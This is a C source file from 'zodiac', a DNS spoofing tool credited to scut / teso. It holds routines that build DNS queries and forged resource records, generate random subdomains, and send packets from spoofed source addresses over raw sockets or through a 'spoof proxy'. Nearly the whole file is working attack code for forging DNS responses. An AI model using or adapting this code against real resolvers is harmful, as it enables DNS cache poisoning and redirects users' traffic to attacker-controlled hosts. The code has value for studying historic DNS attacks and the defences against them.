/* zodiac - advanced dns spoofer
 *
 * dns packet construction routines
 * if you need some, just borrow here and drop me a line of credit :)
 *
 * by scut / teso
 */

#include <libnet.h>	/* route's owning library =) */
#include <arpa/nameser.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include "common.h"
#include "dns.h"
#include "dns-build.h"
#include "dns-tag.h"
#include "io-udp.h"
#include "network.h"
#include "zodiac.h"


extern char *	match_hash;


/* dns_build_random
 *
 * prequel the domain name `domain' with a random sequence of characters
 * with a random length if len is zero, or a fixed length if len is != 0
 *
 * return the allocated new string
 */

char *
dns_build_random (char *domain, size_t len)
{
	int	dlen, cc;
	char	*pr;

	cc = dlen = (len == 0) ? m_random (3, 16) : len;
	pr = xcalloc (1, strlen (domain) + dlen + 2);
	for (; dlen > 0; --dlen) {
		char	p;

		(int) p = m_random ((int) 'a', (int) 'z');
		pr[dlen - 1] = p;
	}
	pr[cc] = '.';
	memcpy (pr + cc + 1, domain, strlen (domain));

	return (pr);
}


/* dns_domain
 *
 * return a pointer to the beginning of the SLD within a full qualified
 * domain name `domainname'.
 *
 * return NULL on failure
 * return a pointer to the beginning of the SLD on success
 */

char *
dns_domain (char *domainname)
{
	char	*last_label = NULL,
		*hold_label = NULL;

	if (domainname == NULL)
		return (NULL);

	/* find last SLD
	 */
	for (; *domainname != '\x00'; ++domainname) {
		if (*domainname == '.') {
			last_label = hold_label;
			hold_label = domainname + 1;
		}
	}

	return (last_label);
}


/*
 * gets the domain of an in-addr.arpa string.
 * 123.123.123.123.in-addr.arpa ==> 123.123.123.in-addr.arpa
 * return a pointer inside arpaname on success
 * return NULL on failure
 */

char *
dns_ptr_domain (char *arpaname)
{
	char	*dot;

	if (strstr (arpaname, "in-addr.arpa") == NULL)
		return (NULL);

	if (atoi (arpaname) == 0)
		return (NULL);

	dot = strchr (arpaname, '.');

	return ((dot == NULL) ? NULL : (dot + 1));
}


/* dns_build_new
 *
 * constructor. create new packet data body
 *
 * return packet data structure pointer (initialized)
 */

dns_pdata *
dns_build_new (void)
{
	dns_pdata	*new;

	new = xcalloc (1, sizeof (dns_pdata));
	new->p_offset = NULL;
	new->p_data = NULL;

	return (new);
}


/* dns_build_destroy
 *
 * destructor. destroy a dns_pdata structure pointed to by `pd'
 *
 * return in any case
 */

void
dns_build_destroy (dns_pdata *pd)
{
	if (pd == NULL)
		return;

	if (pd->p_data != NULL)
		free (pd->p_data);
	free (pd);

	return;
}


/* dns_build_plen
 *
 * calculate the length of the current packet data body pointed to by `pd'.
 *
 * return the packet length
 */

u_short
dns_build_plen (dns_pdata *pd)
{
	if (pd == NULL)
		return (0);

	if (pd->p_data == NULL || pd->p_offset == NULL)
		return (0);

	return ((u_short) (pd->p_offset - pd->p_data));
}


/* dns_build_extend
 *
 * extend a dns_pdata structure data part for `amount' bytes.
 *
 * return a pointer to the beginning of the extension
 */

unsigned char *
dns_build_extend (dns_pdata *pd, size_t amount)
{
	unsigned int	u_ptr = dns_build_plen (pd);

	/* realloc is your friend =)
	 */
	pd->p_data = realloc (pd->p_data, u_ptr + amount);
	if (pd->p_data == NULL) {
		exit (EXIT_FAILURE);
	}

	/* since realloc can move the memory we have to calculate
	 * p_offset completely from scratch
	 */
	pd->p_offset = pd->p_data + u_ptr + amount;

	return (pd->p_data + u_ptr);
}


/* dns_build_ptr
 *
 * take a numeric quad dot notated ip address `ip_str' and build a char
 * domain out of it within the IN-ADDR.ARPA domain.
 *
 * return NULL on failure
 * return a char pointer to the converted domain name
 */

char *
dns_build_ptr (char *ip_str)
{
	char	*ip_ptr;
	int	dec[4];
	int	n;

	if (ip_str == NULL)
		return (NULL);

	/* kludge for functions that already pass a reversed string
	 */
	if (strstr (ip_str, "in-addr.arpa"))
		return (xstrdup (ip_str));

	/* parse ip string, on failure drop conversion
	 */
	n = sscanf (ip_str, "%d.%d.%d.%d", &dec[0], &dec[1], &dec[2], &dec[3]);
	if (n != 4)
		return (NULL);

	/* allocate a new string of the required length
	 */
	ip_ptr = xcalloc (1, strlen (ip_str) + strlen (".in-addr.arpa") + 1);
	sprintf (ip_ptr, "%d.%d.%d.%d.in-addr.arpa", dec[3], dec[2], dec[1], dec[0]);

	return (ip_ptr);
}


/* dns_build_q
 *
 * append a query record into a dns_pdata structure, where `dname' is the
 * domain name that should be queried, using `qtype' and `qclass' as types.
 *
 * conversion of the `dname' takes place according to the value of `qtype':
 *
 * qtype    | expected dname format | converted to
 * ---------+-----------------------+-----------------------------------------
 * T_PTR   | char *, ip address    | IN-ADDR.ARPA dns domain name
 * T_A     | char *, full hostname | dns domain name
 * T_NS    | "                     | "
 * T_CNAME | "                     | "
 * T_SOA   | "                     | "
 * T_WKS   | "                     | "
 * T_HINFO | "                     | "
 * T_MINFO | "                     | "
 * T_MX    | "                     | "
 * T_ANY   | "                     | "
 *
 * return (beside adding the record) the pointer to the record within the data
 */

unsigned char *
dns_build_q (dns_pdata *pd, char *dname, u_short qtype, u_short qclass)
{
	unsigned char	*qdomain = NULL;
	unsigned char	*tgt, *rp;
	int		dlen;

	switch (qtype) {
	case (T_PTR):
		/* convert in itself, then convert to a dns domain
		 */
		dname = dns_build_ptr (dname);
		if (dname == NULL)
			return (NULL);

	case (T_A):
	case (T_NS):
	case (T_CNAME):
	case (T_SOA):
	case (T_WKS):
	case (T_HINFO):
	case (T_MINFO):
	case (T_MX):
	case (T_TXT):
	case (T_ANY):
		/* convert to a dns domain
		 */
		dlen = dns_build_domain (&qdomain, dname);
		if (dlen == 0)
			return (NULL);
		break;
	default:
		return (NULL);
	}

	tgt = rp = dns_build_extend (pd, dlen + sizeof (qtype) + sizeof (qclass));

	memcpy (tgt, qdomain, dlen);
	tgt += dlen;
	free (qdomain);

	PUTSHORT (qtype, tgt);
	PUTSHORT (qclass, tgt);

	return (rp);
}


/* dns_build_rr
 *
 * append a resource record into a dns_pdata structure, pointed ty by `pd',
 * where `dname' is the domain name the record belongs to, `type' and `class'
 * are the type and class of the dns data part, `ttl' is the time to live,
 * the time in seconds how long to cache the record. `rdlength' is the length
 * of the resource data pointed to by `rdata'.
 * depending on `type' the data at `rdata' will be converted to the appropiate
 * type:
 *
 * type   | rdata points to     | will be
 * -------+---------------------+---------------------------------------------
 * T_A   | char IP address     | 4 byte network byte ordered IP address
 * T_PTR | char domain name    | encoded dns domain name
 * T_NS  | char domain name    | encoded dns domain name
 *
 * return (beside adding the record) the pointer to the record within the data
 */

unsigned char *
dns_build_rr (dns_pdata *pd, unsigned char *dname, u_short type, u_short class,
	u_long ttl, void *rdata)
{
	char		*ptr_ptr = NULL;
	struct in_addr	ip_addr;		/* temporary, to convert */
	unsigned char	*qdomain = NULL;
	unsigned char	*tgt, *rp = NULL;
	u_short		rdlength = 0;
	unsigned char	*rdata_converted;	/* converted rdata */
	int		n;

	switch (type) {
	case (T_A):

		/* resolve the quad dotted IP address, then copy it into the
		 * rdata array
		 */

		ip_addr.s_addr = net_resolve ((char *) rdata);
		rdata_converted = xcalloc (1, sizeof (struct in_addr));
		memcpy (rdata_converted, &ip_addr.s_addr, sizeof (struct in_addr));
		rdlength = 4;

		break;

	case (T_NS):
	case (T_CNAME):
	case (T_PTR):

		/* build a dns domain from the plaintext domain name
		 */
                n = dns_build_domain ((unsigned char **) &rdata_converted, (char *) rdata);
                if (n == 0)
			return (NULL);
		rdlength = n;

		break;

	case (T_TXT):

		rdata_converted = xstrdup (rdata);
		rdlength = strlen (rdata_converted);

		break;

	default:
		return (NULL);
	}

	/* create a real dns domain from the plaintext query domain
	 */
	switch (type) {
	case (T_PTR):
		ptr_ptr = dns_build_ptr (dname);
		dname = ptr_ptr;
	default:
		n = dns_build_domain (&qdomain, dname);
		if (n == 0)
			goto rr_fail;
		break;
	}
	if (ptr_ptr != NULL)
		free (ptr_ptr);

	/* extend the existing dns packet to hold our extra rr record
	 */
	tgt = rp = dns_build_extend (pd, dns_labellen (qdomain) + sizeof (type) +
		sizeof (class) + sizeof (ttl) + sizeof (rdlength) + rdlength);

	memcpy (tgt, qdomain, dns_labellen (qdomain));
	tgt += dns_labellen (qdomain);
	free (qdomain);

	PUTSHORT (type, tgt);
	PUTSHORT (class, tgt);
	PUTLONG (ttl, tgt);
	PUTSHORT (rdlength, tgt);

	memcpy (tgt, rdata_converted, rdlength);
	tgt += rdlength;

rr_fail:
	free (rdata_converted);

	return (rp);
}


/* dns_build_query_label
 *
 * build a query label given from the data `query' that should be enclosed
 * and the query type `qtype' and query class `qclass'.
 * the label is passed back in printable form, not in label-length form.
 *
 * qtype	qclass		query
 * -----------+---------------+-----------------------------------------------
 * A		IN		pointer to a host- or domainname
 * PTR		IN		pointer to a struct in_addr
 *
 * ... (to be extended) ...
 *
 * return 0 on success
 * return 1 on failure
 */

int
dns_build_query_label (unsigned char **query_dst, u_short qtype, u_short qclass, void *query)
{
	char		label[256];
	struct in_addr	*ip;

	/* we do only internet queries (qclass is just for completeness)
	 * also drop empty queries
	 */
	if (qclass != C_IN || query == NULL)
		return (1);

	switch (qtype) {
	case (T_A):	*query_dst = xstrdup (query);
			break;

	case (T_PTR):	memset (label, '\0', sizeof (label));
			ip = (struct in_addr *) query;
			net_printipr (ip, label, sizeof (label) - 1);
			scnprintf (label, sizeof (label), ".in-addr.arpa");
			*query_dst = xstrdup (label);
			break;
	default:	return (1);
			break;
	}

	return (0);
}


/* dns_build_domain
 *
 * build a dns domain label sequence out of a printable domain name
 * store the resulting domain in `denc', get the printable domain
 * from `domain'.
 *
 * return 0 on failure
 * return length of the created domain (include suffixing '\x00')
 */

int
dns_build_domain (unsigned char **denc, char *domain)
{
	char	*start = domain,
		*out,
		c = '\0';
        int	n = strlen (domain);

	if (n > MAXDNAME)
		return (0);

	out = *denc = xcalloc (1, n + 2);

	domain += n - 1;
	out += n + 1;
	*out-- = 0;

	n = 0;

	while (domain >= start) {
		c = *domain--;
		if (c == '.') {
			*out-- = n;
			n = 0;
		} else {
			*out-- = c;
			n++;
		}
	}

	if (n != '\0')
		*out-- = n;

        return (strlen (out + 1) + 1);
}

/* deprecated, old version

int
dns_build_domain (unsigned char **denc, char *domain)
{
	char	*b, *dst;

	if (strlen (domain) >= 255)
		return (0);

	dst = *denc = xcalloc (1, strlen (domain) + 2);

	*dst = (unsigned char) dns_build_domain_dotlen (domain);
	dst++;

	for (b = domain ; *b != '\x00' ; ++b) {
		if (*b == '.') {
			*dst = (unsigned char) dns_build_domain_dotlen (b + 1);
		} else {
			*dst = *b;
		}
		++dst;
	}

	*dst = '\x00';
	dst += 1;

	return ((unsigned long int) ((unsigned long) dst - (unsigned long) *denc));
}
*/


/* dns_build_domain_dotlen
 *
 * helper routine, determine the length of the next label in a human
 * printed domain name
 *
 * return the number of characters until an occurance of \x00 or '.'
 */

int
dns_build_domain_dotlen (char *label)
{
	int	n;

	/* determine length
	 */
	for (n = 0; *label != '.' && *label != '\x00'; n++, ++label)
		;

	return (n);
}


/* dns_packet_send
 *
 * send a prepared dns packet spoofing from `ip_src' to `ip_dst', using
 * source port `prt_src' and destination port `prt_dst'. the dns header
 * data is filled with `dns_id', the dns identification number of the
 * packet, `flags', which are the 16bit flags in the dns header, then
 * four count variables, each for a dns segment: `count_q' is the number
 * of queries, `count_a' the number of answers, `count_ns' the number of
 * nameserver entries and `count_ad' the number of additional entries.
 * the real dns data is aquired from `dbuf', `dbuf_s' bytes in length.
 * the dns data should be constructed using the dns_build_* functions.
 * if the packet should be compressed before sending it, `compress'
 * should be set to 1.
 *
 * return 0 on success
 * return 1 on failure
 */

int
dns_packet_send (char *ip_src, char *ip_dst, u_short prt_src, u_short prt_dst,
	u_short dns_id, u_short flags, u_short count_q, u_short count_a,
	u_short count_ns, u_short count_ad, dns_pdata *pd, int compress)
{
	int		sock;		/* raw socket, yeah :) */
	int		n;		/* temporary return value */
	unsigned char	buf[4096];	/* final packet buffer */
	unsigned char	*dbuf = pd->p_data;
	size_t		dbuf_s = dns_build_plen (pd);
	struct in_addr	s_addr,
			d_addr;


	s_addr.s_addr = net_resolve (ip_src);
	d_addr.s_addr = net_resolve (ip_dst);



	libnet_build_dns (	dns_id,		/* dns id (the famous one, 'antilove'd by many users ;) */
				flags,		/* standard query response */
				count_q,	/* count for query */
				count_a,	/* count for answer */
				count_ns,	/* count for authoritative information */
				count_ad,	/* count for additional information */
				dbuf,		/* buffer with the queries/rr's */
				dbuf_s,		/* query size */
				buf + IP_H + UDP_H);		/* write into packet buffer */

	libnet_build_udp (	prt_src,	/* source port */
				prt_dst,	/* 53 usually */
				NULL,		/* content already there */
				DNS_H + dbuf_s,	/* same */
				buf + IP_H);	/* build after ip header */

	libnet_build_ip (	UDP_H + DNS_H + dbuf_s,	/* content size */
				0,		/* tos */
				libnet_get_prand (PRu16),	/* id :) btw, what does 242 mean ? */
				0,		/* frag */
				64,		/* ttl */
				IPPROTO_UDP,	/* subprotocol */
				s_addr.s_addr,	/* spoofa ;) */
				d_addr.s_addr,	/* local dns querier */
				NULL,		/* payload already there */
				0,		/* same */
				buf);		/* build in packet buffer */

	libnet_do_checksum (buf, IPPROTO_UDP, UDP_H + DNS_H + dbuf_s);
	libnet_do_checksum (buf, IPPROTO_IP, IP_H);

	/* check whether we have to send out our putty through a spoof proxy :-]
	 */
	if (zodiac_spoof_proxy == NULL) {

		/* mark packet so we don't fucking catch our own packets =-)
		 */
		dns_tag_add (ip_src, ip_dst, prt_src, prt_dst, dns_id);

		sock = libnet_open_raw_sock(IPPROTO_RAW);
		if (sock == -1)
			return (1);
		n = libnet_write_ip (sock, buf, UDP_H + IP_H + DNS_H + dbuf_s);
		if (n < UDP_H + IP_H + DNS_H + dbuf_s) {
			return (1);
		}

		close (sock);

	} else {
		socklen_t	p_len = UDP_H + IP_H + DNS_H + dbuf_s;
		unsigned char	*p_buf;

		/* set matching hash
		 */
		p_buf = xcalloc (1, p_len + 16);
		memcpy (p_buf + 16, buf, p_len);
		memcpy (p_buf, match_hash, 16);
		p_len += 16;

		udp_write (zodiac_spoof_proxy, zodiac_spoof_proxy_port, p_buf,
			p_len, zodiac_spoof_proxy_key);

		free (p_buf);
	}

	return (0);
}


